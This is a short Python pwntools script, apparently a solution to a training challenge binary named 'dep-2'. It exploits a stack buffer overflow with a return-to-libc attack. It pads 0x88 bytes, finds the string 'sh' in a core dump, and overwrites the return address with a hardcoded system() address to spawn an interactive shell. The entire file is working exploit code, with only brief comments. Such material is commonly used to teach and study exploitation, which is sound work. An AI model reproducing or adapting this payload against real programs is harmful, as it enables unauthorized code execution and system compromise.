#!/usr/bin/env python
from pwn import *

p = process("./dep-2")

# check buffer size, 0x08048527 <+4>: lea -0x88(%ebp),%ebx
#[ buffer (0x88)] [saved ebp]  [ret]
string = "A" * 0x88 + "BBBB" + "CCCC"

p.send(string)
p.wait()
c = Core('./core')
addr_of_sh = c.stack.find('sh')
print("addr_of_sh %s" % addr_of_sh )
print("stack %s" % hex(addr_of_sh))

p = process("./dep-2")
# Go to gdb, break in main and print system 0xf7e39da0
#  [ buffer(0x88)] [saved ebp]      [system()]      [xxxx]    [addr_of_sh]
buffer = "A" * 0x88 + "BBBB" + "\xa0\x9d\xe3\xf7" + "DDDD" + p32(addr_of_sh)

p.send(buffer)

p.interactive()
